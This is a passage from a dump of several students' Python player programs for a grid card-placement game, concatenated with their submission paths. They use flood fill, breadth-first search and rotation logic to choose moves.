        if field[r_corner][s_corner + k] != "." or field[r_corner + r_size - 1][s_corner + k] != ".":
            return False
        if not touch:
            if ((r_corner - 1) >= 0 and field[r_corner - 1][s_corner + k] != ".") or ((r_corner + r_size) <= (r_field - 1) and field[r_corner + r_size][s_corner + k] != "."):
                touch = True
    return touch

def rotate(r_size, s_size, card): #otoci kartu o 90st po smeru hodin
    result = []
    for i in range(s_size):
        result.append([])
        for j in range(r_size -1, -1, -1):
            result[i].append(card[j][i])
    return result

def isFieldEmpty(r_size, s_size, field): #zjisti, jestli je na desce polozena nejaka karta
    for i in range(r_size):
        for j in range(s_size):
            if field[i][j] != ".":
                return False
    return True


class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "havamart"

        self.field = [] #inicializace vlastniho pole
        for i in range(self.boardRows):
            self.field.append([])
            for j in range(self.boardCols):
                self.field[i].append(".")

        for card in self.cardsOnDesk: #polozeni karet, ktere jsou jiz na stole (asi zbytecne, zadne tam nejsou :/ )
            r_corner, s_corner = card[:2]
            karta = card[2]
            for i in range(len(karta)):
                for j in range(len(karta[0])):
                    self.field[r_corner + i][s_corner + j] = karta[(len(karta[0]) * i) + j]
        

    def play(self, newCardOnDesk):
        if len(self.cardsAtHand) == 0: #nemuzu hrat, pokud nemam karty
            return []

        if newCardOnDesk != []: #zapis protivnikovi karty do vlastniho pole
            r_corner, s_corner = newCardOnDesk[:2]
            karta = newCardOnDesk[2]
            for i in range(len(karta)):
                for j in range(len(karta[0])):
                    self.field[r_corner + i][s_corner + j] = karta[i][j]
        else: #pokud zacinam, polozim prvni kartu z ruky do rohu hriste
            if isFieldEmpty(self.boardRows, self.boardCols, self.field):
                card = self.cardsAtHand.pop(0)
                r_size = len(card)
                s_size = len(card[0])
                for i in range(r_size):
                    for j in range(s_size):
                        self.field[i][j] = card[i][j]
                return [0, 0, card]

        for card in self.cardsAtHand: #vyzkousim vsechny karty, ktere mam v ruce
            r_size = len(card) #velikosti zkoumane karty
            s_size = len(card[0])

            for i in range(self.boardRows - r_size + 1): #zkoumam vsechna policka, kam by se karta teoreticky vesla
                for j in range(self.boardCols - s_size + 1):
                    if self.field[i][j] == "." and checkSpot(i, j, r_size, s_size, self.field, self.boardRows, self.boardCols): #kontrola pravidel
                        for k in range(r_size): #polozeni karty do vlastniho pole
                            for l in range(s_size):
                                self.field[i + k][j + l] = card[k][l]
                        self.cardsAtHand.remove(card) #odebrani karty z ruky
                        return [i, j, card] #ohlaseni tahu
                        
            for i in range(self.boardRows - s_size + 1):
                for j in range(self.boardCols - r_size +1):
                    if self.field[i][j] == "." and checkSpot(i, j, s_size, r_size, self.field, self.boardRows, self.boardCols):
                        self.cardsAtHand.remove(card)
                        card = rotate(r_size, s_size, card)
                        for k in range(s_size):
                            for l in range(r_size):
                                self.field[i + k][j + l] = card[k][l]
                        return [i, j, card]
        return [] #nebyl nalezen zadny legalni tah -> nemuzu hrat    pavlim60
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/pavlim60______________________
        player.py
import base as BASE
import copy, random, time, sys, os, heapq
from PIL import Image, ImageDraw


#basic cards with colors 1 and 2
#note that Brute can provide you also other cards!
C44a = [ [0,1,2,0], 
         [1,1,2,2],
         [2,2,1,1],
         [0,2,1,0] ]  

C44b = [ [0,0,1,0], 
         [1,1,1,0],
         [0,2,2,2],
         [0,2,0,0] ] 

C53b = [ [0,1,0], 
         [0,1,0],
         [0,1,0],
         [0,1,1],
         [0,0,0] ]

C53c = [ [0,1,0], 
         [0,1,0],
         [0,1,1],
         [0,2,2],
         [0,2,0] ]

C33a = [ [0,1,0], 
         [1,1,2],
         [0,0,2] ]

C33c = [ [1,2,1], 
         [2,2,2], 
         [1,2,1] ]


def PM(matrix):
    for line in matrix:
        for n in line:
            print(n, end=' ')
        print()

def newMatrix(rows, cols, fill):
    new_matrix = []
    for r in range(rows):
        new_matrix.append([fill] * cols)
    return new_matrix

def floodfill(matrix, r, c, fill):  # fill is what i want to overwrite
    area = 0
    stack = [(r, c)]
    # r_bound_top = bound_i[0]        # bounds for deciding if the move is valid - if a color component has been expanded
    # r_bound_bottom = r_bound_top + card_size[0] - 1
    # c_bound_left = bound_i[1]
    # c_bound_right = c_bound_left + card_size[1] - 1
    while len(stack) > 0:
        r, c = stack.pop()
        # if r < r_bound_top or r > r_bound_bottom or c < c_bound_left or c > c_bound_right:
        #     valid = True
        matrix[r][c] = '#'    # fill the cell
        area += 1
        if r > 0 and matrix[r - 1][c] == fill and [r - 1, c] not in stack:
            stack.append([r - 1, c])
        if r + 1 < len(matrix) and matrix[r + 1][c] == fill and [r + 1, c] not in stack:
            stack.append([r + 1, c])
        if c > 0 and matrix[r][c - 1] == fill and [r, c - 1] not in stack:
            stack.append([r, c - 1])
        if c + 1 < len(matrix[r]) and matrix[r][c + 1] == fill and [r, c + 1] not in stack:
            stack.append([r, c + 1])
    # if valid:
    #     return area
    # else:
    #     return 0
    return area

# def findColorIndices(card):
#     color_indices = []
#     tmp_card = copy.deepcopy(card.card)
#     for r in range(card.rows):
#         for c in range(card.cols):
#             if tmp_card[r][c] != 0:
#                 color_indices.append((r, c))
#                 floodfill(tmp_card, r, c, tmp_card[r][c], [0,0], [0,0])    # use floodfill to only find one index for each color component
#                                                                            # here last two args irrelevant
#     return color_indices

def countCard(card):
    c = 0
    card_scores = {}
    for side in range(2):   # left, right edge
        for r in range(card.rows):
            if card.card[r][c] != 0:
                score = floodfill(copy.deepcopy(card.card), r, c, card.card[r][c])    # last two args irrelevant here
            else:
                score = 0
            card_scores[(r, c)] = Cell((r, c), card.card[r][c], score)
        c = card.cols - 1
    r = 0
    for side in range(2):   # top, bottom edge
        for c in range(1, card.cols - 1):   # leave out the corners - already done
            if card.card[r][c] != 0:
                score = floodfill(copy.deepcopy(card.card), r, c, card.card[r][c])    # last two args irrelevant here
            else:
                score = 0
            card_scores[(r, c)] = Cell((r, c), card.card[r][c], score)
        r = card.rows - 1
    return card_scores
            
def rotateCard(card): # counterclockwise
    rotated = []
    for r in range(card.cols):  # rotate card
        l = card.rows * [0]
        rotated.append(l)
    for r in range(card.rows):
        for i in range(card.cols):
            rotated[card.cols - i - 1][r] = card.card[r][i]
    card.card = rotated
    new_scores = {}
    for cell_pos in card.scores:    # rotate scores
        new_r = card.cols - cell_pos[1] - 1
        new_c = cell_pos[0]
        new_scores[(new_r, new_c)] = card.scores[cell_pos]
    card.scores = new_scores
    card.rows = len(rotated)    # rotate size
    card.cols = len(rotated[0])

def countScoreOfPlacementSide(gameboard, card, r_offset, global_c, local_c):    # for counting score of placing card on gameboard to position (r_offset, c), global_c is c-coord of relevant board cells, local_c is c-coord of cell on card
    score = 0
    for cell in range(card.rows):       # cell is local r for cells of card being placed
        global_r = r_offset + cell                 # global r, c is position of cell on board (on card last placed), next to card currently being placed
        if (global_r, global_c) in gameboard.board_scores and gameboard.board_scores[(global_r, global_c)].score > 0 and gameboard.board_scores[(global_r, global_c)].color == card.scores[(cell, local_c)].color:   # check if color on board, then if color on board is the same as on card being placed
            score += gameboard.board_scores[(global_r, global_c)].score + card.scores[(cell, local_c)].score
    return score

def countScoreOfPlacementTop(gameboard, card, c_offset, global_r, local_r):    # for counting score of placing card on gameboard to position (r, c_offset), global_r is r-coord of relevant board cells, local_r is r-coord of cell on card
    score = 0
    for cell in range(card.cols):       # cell is local c for cells of card being placed
        global_c = c_offset + cell                 # global r, c is position of cell on board (on card last placed), next to card currently being placed
        if (global_r, global_c) in gameboard.board_scores and gameboard.board_scores[(global_r, global_c)].score > 0 and gameboard.board_scores[(global_r, global_c)].color == card.scores[(local_r, cell)].color:   # check if color on board, then if color on board is the same as on card being placed
            score += gameboard.board_scores[(global_r, global_c)].score + card.scores[(local_r, cell)].score
    return score
    

class BoardCell:    # max_width, max_height is max size of card that fits at specified index
    def __init__(self, width, height):
        if width <= 5:
            self.max_width = width  
        else:
            self.max_width = 6      # max_width == 6 means the width is more than five
        if height <= 5:
            self.max_height = height
        else:
            self.max_height = 6

class Cell:
    def __init__(self, position, color, score):
        self.r = position[0]    # for cards at hand local coords, for cards on board global coords
        self.c = position[1]
        self.color = color
        self.score = score

class Gameboard:
    def __init__(self, boardRows, boardCols):
        self.boardRows = boardRows
        self.boardCols = boardCols
        self.board = newMatrix(boardRows, boardCols, 0)
        self.positions = {}
        self.board_scores = {}
        for r in range(boardRows):      # initialize self.positions
            for c in range(boardCols):
                self.positions[(r, c)] = {}
                for s in possible_card_sizes:
                    self.positions[(r, c)][s] = False
                    # if r <= boardRows - s[0] and c <= boardCols - s[1]:
                    #     self.positions[(r, c)][s] = True
                    # else:
                    #     self.positions[(r, c)][s] = False 
        
        #print(self.positions)
        #print(self.positions[(boardRows - 4, boardCols - 5)])
        self.size_matrices = {}        # contains a matrix for each width (int) of card; matrix of boardCells
        for width in range(3, 6):
            self.size_matrices[width] = newMatrix(boardRows, boardCols, 0)
        for r in range(boardRows - 1, -1, -1):      # initialize self.size_matrices
            width_count = 0
            for c in range(boardCols - 1, -1, -1):
                width_count += 1
                for width in range(3, 6):
                    if width <= boardCols - c:
                        if r < boardRows - 1:
                            #print(r, self.size_matrices[width])
                            height = self.size_matrices[width][r + 1][c].max_height + 1
                        else:
                            height = 1
                    else:
                        height = 0
                    self.size_matrices[width][r][c] = BoardCell(width_count, height)
    def insertCard(self, position, size, card, replace_zeroes):
        for r in range(size[0]):
            for c in range(size[1]):
                if not replace_zeroes or card[r][c] != 0:
                    self.board[position[0] + r][position[1] + c] = card[r][c]
                else:
                    self.board[position[0] + r][position[1] + c] = 'X'
    def updateScores(self, card_size, card_r, card_c):
        c = card_c
        for side in range(2):   # left, right edge of new card
            for r in range(card_r, card_r + card_size[0]):  # global coord
                if self.board[r][c] != 'X':
                    score = floodfill(copy.deepcopy(self.board), r, c, self.board[r][c])
                else:
                    score = 0
                self.board_scores[(r, c)] = Cell((r, c), self.board[r][c], score)
            c = card_c + card_size[1] - 1
        r = 0
        for side in range(2):   # top, bottom edge
            for c in range(card_c + 1, card_c + card_size[1] - 1):   # leave out the corners - already done
                if self.board[r][c] != 'X':
                    score = floodfill(copy.deepcopy(self.board), r, c, self.board[r][c])
                else:
                    score = 0
                self.board_scores[(r, c)] = Cell((r, c), self.board[r][c], score)
            r = card_r + card_size[0] - 1
    def updateFreeSpaces(self, r_range, c_range, new_card_position): # ranges are min and max index, inclusive
        r_bound_top = r_range[0]
        r_bound_bottom = r_range[1]
        c_bound_left = c_range[0]
        c_bound_right = c_range[1]
        new_r, new_c = new_card_position
        for r in range(r_bound_bottom, r_bound_top - 1, -1):
            if c_bound_right + 1 < self.boardCols:
                width_count = self.size_matrices[3][r][c_bound_right + 1].max_width     # max width that fits at current position, in size_matrices max_width is the same for all width
            else:
                width_count = 0
            for c in range(c_bound_right, c_bound_left - 1, -1):
                if self.board[r][c] == 0:
                    width_count += 1
                else:
                    width_count = 0
                for size in possible_card_sizes:
                    if size[1] <= width_count:
                        if r < self.boardRows - 1:
                            height = self.size_matrices[size[1]][r + 1][c].max_height + 1
                        else:
                            height = 1
                        if height >= size[0] and ((r == r_bound_bottom and c != c_bound_right and c + size[1] > new_c) or (c == c_bound_right and r != r_bound_bottom and r + size[0] > new_r) or (r + size[0] == new_r and c + size[1] > new_c and c != c_bound_right) or (c + size[1] == new_c and r + size[0] > new_r and r != r_bound_bottom)):
                            #print(size, r, r_bound_bottom, c, c_bound_right)
                            self.positions[(r, c)][size] = True
                        elif height < size[0]:
                            self.positions[(r, c)][size] = False
                    else:
                        height = 0
                        self.positions[(r, c)][size] = False
                    self.size_matrices[size[1]][r][c].max_width = width_count
                    self.size_matrices[size[1]][r][c].max_height = height
    def updateMoves(self, new_card_r, new_card_c, new_card_size, cards, queue): # new card is card last placed on board
        for cd in range(len(cards)):
            card = cards[cd]
            for rot in range(4):
                rot_card = card.rotations[rot]
                c = new_card_c - rot_card.cols      # left side of new card
                if c >= 0:
                    global_c = new_card_c               # global r, c is position of cell on new card, next to card currently being placed
                    local_c = rot_card.cols - 1         # local c-coord of cell on card being placed
                    range_start = new_card_r - rot_card.rows + 1
                    if range_start < 0:
                        range_start = 0
                    for r in range(range_start, new_card_r + new_card_size[0]):      # r, c is position of card currently being placed
                        if self.positions[(r, c)][(rot_card.rows, rot_card.cols)]:
                            score = countScoreOfPlacementSide(self, rot_card, r, global_c, local_c)
                            # score = 0
                            # for cell in range(rot_card.rows):       # cell is local r for cells of card being placed
                            #     global_r = r + cell                 # global r, c is position of cell on new card, next to card currently being placed
                            #     if (global_r, global_c) in self.board_scores and self.board_scores[(global_r, global_c)].score > 0 and self.board_scores[(global_r, global_c)].color == rot_card.scores[(cell, local_c)].color:   # check if color on board, then if color on board is the same as on card being placed
                            #         score += self.board_scores[(global_r, global_c)].score + rot_card.scores[(cell, local_c)].score
                            heapq.heappush(queue, (-score, cd, rot, (r, c)))
                c = new_card_c + new_card_size[1]   # right side of new card
                if c < self.boardCols:
                    global_c = c - 1
                    local_c = 0
                    range_start = new_card_r - rot_card.rows + 1
                    if range_start < 0:
                        range_start = 0
                    for r in range(range_start, new_card_r + new_card_size[0]):      # r, c is position of card currently being placed
                        if self.positions[(r, c)][(rot_card.rows, rot_card.cols)]:
                            score = countScoreOfPlacementSide(self, rot_card, r, global_c, local_c)
                            # score = 0
                            # for cell in range(rot_card.rows):       # cell is local r for cells of card being placed
                            #     global_r = r + cell                 # global r, c is position of cell on new card, next to card currently being placed
                            #     if (global_r, global_c) in self.board_scores and self.board_scores[(global_r, global_c)].score > 0 and self.board_scores[(global_r, global_c)].color == rot_card.scores[(cell, rot_card.cols - 1)].color:   # check if color on board, then if color on board is the same as on card being placed
                            #         score += self.board_scores[(global_r, global_c)].score + rot_card.scores[(cell, rot_card.cols - 1)].score
                            heapq.heappush(queue, (-score, cd, rot, (r, c)))
                r = new_card_r - rot_card.rows      # top of new card
                if r >= 0:
                    global_r = new_card_r
                    local_r = rot_card.rows - 1
                    range_start = new_card_c - rot_card.cols + 1
                    if range_start < 0:
                        range_start = 0
                    for c in range(range_start, new_card_c + new_card_size[1]):
                        if self.positions[(r, c)][(rot_card.rows, rot_card.cols)]:
                            score = countScoreOfPlacementTop(self, rot_card, c, global_r, local_r)
                            heapq.heappush(queue, (-score, cd, rot, (r, c)))
                r = new_card_r + new_card_size[0]   # bottom of new card
                if r < self.boardRows:
                    global_r = r - 1
                    local_r = 0
                    range_start = new_card_c - rot_card.cols + 1
                    if range_start < 0:
                        range_start = 0
                    for c in range(range_start, new_card_c + new_card_size[1]):
                        if self.positions[(r, c)][(rot_card.rows, rot_card.cols)]:
                            score = countScoreOfPlacementTop(self, rot_card, c, global_r, local_r)
                            heapq.heappush(queue, (-score, cd, rot, (r, c)))




class Card:
    def __init__(self, matrix, rotation_n):
        self.card = matrix
        self.rows = len(matrix)
        self.cols = len(matrix[0])
        self.scores = countCard(self)
        self.active = True
        if rotation_n == 0:
            rotations = [self]
            for r in range(3):
                rotations.append(Card(rotations[r].card, r + 1))
            self.rotations = rotations
        else:
            rotateCard(self)
        #self.color_indices = findColorIndices(self)
    

possible_card_sizes = [(3,3),(4,4),(3,5),(5,3),(5,5)]
class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "Mostly Harmless"
        self.gameboard = Gameboard(boardRows, boardCols)
        self.h_queue = []
        cards = []
        for c in cardsAtHand:
            new_card = Card(c, 0)
            cards.append(new_card)
            #print(new_card.scores[(0, 0)], new_card.rotations[1].scores[(3, 0)], )
            # PM(new_card.card)
            # print(new_card.scores)
            # for rotation in range(len(new_card.rotations)):
            #     print(rotation)
                #print(new_card.rotations[rotation].scores)
                # for cell in new_card.rotations[rotation].scores:
                #     print(cell, new_card.rotations[rotation].scores[cell].score, new_card.rotations[rotation].scores[cell].color)
                # print(new_card.rotations[rotation].scores[0,0], new_card.rotations[rotation].scores[])
                #PM(new_card.rotations[rotation].card)
            #print(new_card.color_indices)
        self.cards = cards
    moves_count = 0
    def updateGameboard(self, r, c, size, card):    
        r_bound_top = r - 5
        r_bound_bottom = r + size[0]
        c_bound_left = c - 5
        c_bound_right = c + size[1]
        if r_bound_top < 0:
            r_bound_top = 0
        if r_bound_bottom >= self.gameboard.boardRows:
            r_bound_bottom = self.gameboard.boardRows - 1
        if c_bound_left < 0:
            c_bound_left = 0
        if c_bound_right >= self.gameboard.boardCols:
            c_bound_right = self.gameboard.boardCols - 1
        self.gameboard.insertCard((r, c), size, card, True)
        self.gameboard.updateFreeSpaces((r_bound_top, r_bound_bottom), (c_bound_left, c_bound_right), (r, c))
        self.gameboard.updateScores(size, r, c)
        self.gameboard.updateMoves(r, c, size, self.cards, self.h_queue)
        
    def play(self,newCardOnDesk):
        """ this method is called during the game. 
            The input argument newCardOnDesk is:
            - [] if other player didn't place any card in his move), or
            - [row, col, cardMatrix], which informs your player that cardMatrix was placed at row,col to the game board
            
            Return value: 
            - [ row, col, cardMatrix ] if you want to place a card, or
            - [] if no card can be placed 
        """

        #recommened steps 
        #step 0: write newCardOnDesk to list of cards that are on the board game
        #step 1: compute all possible placement of your all (so for available) cards
        #step 2: evaluate each placement, i.e., compute score for it
        #step 3: select card that you want to place to the game board, mark it as used (not available in future)
        #step 4: return your placement, or [] if no placement can be made
        #the following code DOES NOT provides correct moves, 
        #it just return random card at random position

        self.moves_count += 1

        if len(newCardOnDesk) != 0:
            new_r = newCardOnDesk[0]
            new_c = newCardOnDesk[1]
            new_card = newCardOnDesk[2]
            new_size = (len(new_card), len(new_card[0]))
            self.updateGameboard(new_r, new_c, new_size, new_card)
            
        if len(newCardOnDesk) == 3:
            self.cardsOnDesk += [ newCardOnDesk ]

        # if len(self.cards) == 0:
        #     return []

        if len(self.cardsOnDesk) == 0:  # first move
            card = self.cards[0]
            card.active = False
            self.updateGameboard(5, 5, (card.rows, card.cols), card.card)
            self.cardsOnDesk += [[5, 5, card.card]]
            return [5, 5, card.card]

        while len(self.h_queue) > 0:
            score, cardindx, rot, pos = heapq.heappop(self.h_queue)
            card = self.cards[cardindx]
            rot_card = card.rotations[rot]
            if card.active and self.gameboard.positions[pos][(rot_card.rows, rot_card.cols)]:
                card.active = False
                self.updateGameboard(pos[0], pos[1], (rot_card.rows, rot_card.cols), rot_card.card)
                self.cardsOnDesk += [ [pos[0], pos[1], rot_card.card ] ]
                return [pos[0], pos[1], rot_card.card]
        return []

        # for cardindx in range(len(self.cards)):
        #     card = self.cards[cardindx]
        #     for rotation in range(2):
        #         # cardindx = random.randint(0, len(self.cardsAtHand)-1)  #random index of a card
        #         # row = random.randint(0, self.boardRows-cardRows-1) 
        #         # col = random.randint(0, self.boardCols-cardCols-1)
        #         row = -1
        #         if self.moves_count == 1 and len(newCardOnDesk) == 0:
        #             row = 5
        #             col = 5
        #         for r in range(self.gameboard.boardRows):
        #             for c in range(self.gameboard.boardCols):
        #                 if self.gameboard.positions[(r, c)][(card.rows, card.cols)]:
        #                     row = r
        #                     col = c
        #                     break
        #             if row != -1:
        #                 break
        #         if row != -1:
        #             self.cards = self.cards[:cardindx] + self.cards[cardindx+1:]  #remove selected card so its not used in future
        #             self.cardsOnDesk += [ [row, col, card.card ] ]
        #             self.updateGameboard(row, col, (card.rows, card.cols), card.card)
        #             return [row, col, card.card ]
        #         card = Card(copy.deepcopy(card.card))
        #         card.rotateCard()
        # return []
        #self.gameboard.insertCard((row, col), (len(card), len(card[0])), card, True)
        #PM(self.gameboard)


        


if __name__ == "__main__":
    """ when you run:
        python3 player.py

        you should get set of .png files with the progress of the game
    """

    tmp = [C44a, C44b, C33a,C33c, C53c, C53b]*1

    p1 = Player("testA", 19, 23, tmp)
    p2 = Player("testB", 19, 23, tmp)

    p2move = []
    gameStep = 0
    while True:
        p1move = p1.play(p2move)
        print("p1 returned", p1move)
        p1.drawCards(p1.boardRows, p1.boardCols, p1.cardsOnDesk,"move-{:02}b-A.png".format(gameStep))

        p2move = p2.play(p1move)    
        print("p2 returned", p2move)
        p2.drawCards(p2.boardRows, p2.boardCols, p2.cardsOnDesk,"move-{:02}b-B.png".format(gameStep))
        gameStep += 1
        if p1move == [] and p2move == []:
            print("end of game")
            quit()


landrfil-koubajac
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/landrfil-koubajac______________________
    s123a
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/landrfil-koubajac/s123a______________________
        player.py
import base as BASE
import random, time, sys, os
from copy import deepcopy
from PIL import Image, ImageDraw


#basic cards with colors 1 and 2
#note that Brute can provide you also other cards!
C44a = [ [0,1,2,0], 
         [1,1,2,2],
         [2,2,1,1],
         [0,2,1,0] ]  

C44b = [ [0,0,1,0], 
         [1,1,1,0],
         [0,2,2,2],
         [0,2,0,0] ] 

C53b = [ [0,1,0], 
         [0,1,0],
         [0,1,0],
         [0,1,1],
         [0,0,0] ]

C53c = [ [0,1,0], 
         [0,1,0],
         [0,1,1],
         [0,2,2],
         [0,2,0] ]

C33a = [ [0,1,0], 
         [1,1,2],
         [0,0,2] ]

C33c = [ [1,2,1], 
         [2,2,2], 
         [1,2,1] ]

#####
#<Helping functions>

#prints field as coloured characters to the console
def debugPrint(grid : list):
    key = {-1:chr(11035), 0:chr(11036), 1:chr(128997), 2:chr(128999), 3:chr(129000), 4:chr(129001), 5:chr(129002), 6:chr(129003), 7:chr(128992), 8:chr(128993), 9:chr(128994), 10:chr(128995), 11:chr(128996)}
    for line in grid:
        for cell in line:
            print(key[cell], end="")
        print()

#prints traced component in traceComponent func
def printComponent(component, fieldSize): #debug
    matrix = [[0 for _ in range(fieldSize[1])] for _ in range(fieldSize[0])]
    for cell in component:
        matrix[cell[0]][cell[1]] = 5
    debugPrint(matrix)

#determines possible neighbour node for a node in Q
def possibleNeighbors(matrix, node):
    if node[0] - 1 < 0:
        up = None
    else:
        up = (node[0] - 1, node[1])
    if node[0] >= len(matrix) - 1:
        down = None
    else:
        down = (node[0] + 1, node[1])
    if node[1] - 1 < 0:
        left = None
    else:
        left = (node[0], node[1] - 1)
    if node[1] >= len(matrix[0]) - 1:
        right = None
    else:
        right = (node[0], node[1] + 1)
    return up, down, left, right
        
#traces a connected component (of one color) from a starting position using bfs
def traceComponent(matrix, start, beenCounted):
    color = matrix[start[0]][start[1]]
    #if color of node is 0 ends the function
    if color == 0 or beenCounted[start[0]][start[1]] == True:
        return 0, beenCounted
    
    #bfs for same color
    qeue = [start]
    component = [start]
    known = [row[:] for row in beenCounted]
    known[start[0]][start[1]] = True
    while qeue:
        node = qeue.pop(0)
        neighbors = possibleNeighbors(matrix, node)
        for neighbor in neighbors:
            if neighbor == None:
                continue
            if known[neighbor[0]][neighbor[1]] == False and matrix[neighbor[0]][neighbor[1]] == color:
                qeue.append(neighbor)
                known[neighbor[0]][neighbor[1]] = True
                component.append(neighbor)
            elif known[neighbor[0]][neighbor[1]] == False:
                known[neighbor[0]][neighbor[1]] = True

    #printComponent(component, (len(matrix), len(matrix[0]))) #debug
    for cell in component:
        beenCounted[cell[0]][cell[1]] = True
    return len(component), beenCounted #points for the component, matrix of already counted color points 

                
def neighborHasSameColor(matrix, start, direction): #check if the neighbor has the same color and tracing can begin
    if direction == "up":
        if matrix[start[0] - 1][start[1]] == matrix[start[0]][start[1]]:
            return True
    if direction == "down":
        if matrix[start[0] + 1][start[1]] == matrix[start[0]][start[1]]:
            return True
    if direction == "left":
        if matrix[start[0]][start[1] - 1] == matrix[start[0]][start[1]]:
            return True
    if direction == "right":
        if matrix[start[0]][start[1] + 1] == matrix[start[0]][start[1]]:
            return True
    return False

#<Helping functions/>
########

#class of a playing cards, used to keep track of matrix, placement, doing rotations, checking for validity of moves
class Card:
    def __init__(self, matrix):
        self.matrix = matrix
        self.row = 0
        self.column = 0
        self.height = len(matrix)
        self.width = len(matrix[0])

    def rotate(self): #rotate the card
        rotatedMatrix = list(zip(*self.matrix[::-1]))
        self.matrix = [list(row) for row in rotatedMatrix]
        self.height, self.width = self.width, self.height
    
    def checkForSpace(self, field, row, column): #check if the card fits in the field
        for i in range(self.height):
            for j in range(self.width):
                if row + i >= field.size[0] or column + j >= field.size[1]:
                    return False
                elif field.matrix[row + i][column + j] != -1:
                    return False
        return True
    
    def isValidMove(self, field, row, column): #check if the card is touching any other card
        directions = []
        for i in range(self.height):
            if row + i >= field.size[0]:
                break
            widerThanFieldR = (column + self.width >= field.size[1])
            widerThanFieldL = (column - 1 <= -1)
            if not widerThanFieldL:
                if field.matrix[row + i][column - 1] != -1:
                    if "left" not in directions:
                        directions.append("left")
            if not widerThanFieldR:
                if field.matrix[row + i][column + self.width] != -1:
                    if "right" not in directions:
                        directions.append("right")
        
        tallerThanField = (row - 1 <= -1)
        lowerThanField = (row + self.height >= field.size[0])
        allMinusOne = [-1 for _ in range(self.width)]
        if not tallerThanField:
            if field.matrix[row - 1][column:(column + self.width)] != allMinusOne:
                directions.append("up")
        if not lowerThanField:
            if field.matrix[row + self.height][column:(column + self.width)] != allMinusOne:
                directions.append("down")
        
        if directions == []:
            return directions, False
        return directions, True
    
    def print(self): #print the card in the required format for BRUTE
        rtrnString = ""
        rtrnString += str(self.row) + " " + str(self.column) + " "
        rtrnString += str(self.height) + " " + str(self.width)
        for row in self.matrix:
            for cell in row:
                rtrnString += " " + str(cell)
        return rtrnString
                
#keeps track of placed cards onto the field matrix, cards can be added or removed 
class Field:
    def __init__(self, size):
        self.size = size
        self.addedCardsCount = 0
        self.addedCards = [] #not currently implemented 
        self.matrix = [[-1 for _ in range(size[1])] for _ in range(size[0])]
    
    def add_card(self, card, row, column):
        for i in range(card.height):
            for j in range(card.width):
                self.matrix[row + i][column + j] = card.matrix[i][j]
        self.addedCardsCount += 1
    
    def remove_card(self, card, row, column):
        for i in range(card.height):
            for j in range(card.width):
                self.matrix[row + i][column + j] = -1
        
        self.addedCardsCount -= 1
                
#evalute best placement for avaiable cards 
def bestPlacement(avCards, field):
    hasSolution = False
    addedCard = None
    maxPoints = 0
    cardIndex = 0

    for card in avCards:
        for row in range(field.size[0]):
            for column in range(field.size[1]):
                for n in range(4): #try all 4 rotations 
                    hasSpace = card.checkForSpace(field, row, column)
                    directions, isValid = card.isValidMove(field, row, column)
                    if hasSpace and isValid:
                        currentPoints = 0
                        field.add_card(card, row, column)
                        #debugPrint(field.matrix) #debug
                        beenCounted = [[False for _ in range(field.size[1])] for _ in range(field.size[0])]
                        for direction in directions:
                            if direction == "up":
                                for i in range(card.width):
                                    if neighborHasSameColor(field.matrix, (row, column + i), direction):
                                        points, beenCounted = traceComponent(field.matrix, (row, column + i), beenCounted)
                                        currentPoints += points
                                        #print((row - 1, column + i), points) #debug
                            if direction == "down":
                                for i in range(card.width):
                                    if neighborHasSameColor(field.matrix, (row + card.height - 1, column + i), direction):
                                        points, beenCounted = traceComponent(field.matrix, (row + card.height - 1, column + i), beenCounted)
                                        currentPoints += points
                                        #print((row + card.height, column + i), points) #debug
                            if direction == "left":
                                for i in range(card.height):
                                    if neighborHasSameColor(field.matrix, (row + i, column), direction):
                                        points, beenCounted = traceComponent(field.matrix, (row + i, column), beenCounted)
                                        currentPoints += points
                                        #print((row + i, column - 1), points)  #debug
                            if direction == "right":
                                for i in range(card.height):
                                    if neighborHasSameColor(field.matrix, (row + i, column + card.width - 1), direction):
                                        points, beenCounted = traceComponent(field.matrix, (row + i, column + card.width - 1), beenCounted)
                                        currentPoints += points
                                        #print((row + i, column + card.width), points) #debug
                        if currentPoints > maxPoints:
                            maxPoints = currentPoints
                            card.row = row
                            card.column = column
                            addedCard = deepcopy(card)
                            addedCardIndex = cardIndex
                            #print(currentPoints)
                        #print(currentPoints)
                        field.remove_card(card, row, column)
                    directions = []
                    card.rotate()
    cardIndex += 1
    
    avCards.pop(addedCardIndex)
    return addedCard, avCards



class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "Asteroid Destroyer"
        self.field = Field((boardRows, boardCols))
        self.avCards = []
        for item in cardsAtHand:
            card = Card(item)
            self.avCards.append(card)

    def play(self,newCardOnDesk):
        """ this method is called during the game. 
            The input argument newCardOnDesk is:
            - [] if other player didn't place any card in his move), or
            - [row, col, cardMatrix], which informs your player that cardMatrix was placed at row,col to the game board
            
            Return value: 
            - [ row, col, cardMatrix ] if you want to place a card, or
            - [] if no card can be placed 
        """

        #recommened steps 
        #step 0: write newCardOnDesk to list of cards that are on the board game
        #step 1: compute all possible placement of your all (so for available) cards
        #step 2: evaluate each placement, i.e., compute score for it
        #step 3: select card that you want to place to the game board, mark it as used (not available in future)
        #step 4: return your placement, or [] if no placement can be made
        #the following code DOES NOT provides correct moves, 
        #it just return random card at random position

        if len(newCardOnDesk) == 3:
            #add played card by the othe player to the field
            newCard = Card(newCardOnDesk[2])
            newCard.column = newCardOnDesk[1]
            newCard.row = newCardOnDesk[0]
            self.field.add_card(newCard, newCard.row, newCard.column)           

        if len(self.avCards) == 0:
            return []

        elif self.field.addedCardsCount == 0:
            cardIndex = random.randint(0, len(self.avCards) - 1)
            move = self.avCards.pop(cardIndex)
            moveRow = (self.boardRows // 2) - (move.height // 2)
            moveColumn = (self.boardCols // 2) - (move.width // 2)
            while moveRow > (self.boardRows - move.height - 1):
                moveRow -= 1
                if moveRow == 0:
                    break
            while moveColumn > (self.boardCols - move.width - 1):
                moveRow -= 1
                if moveRow == 0:
                    break
            
            move.row = moveRow
            move.column = moveColumn
        
            self.field.add_card(move, move.column, move.row)
            
            return [move.row, move.row, move.matrix]
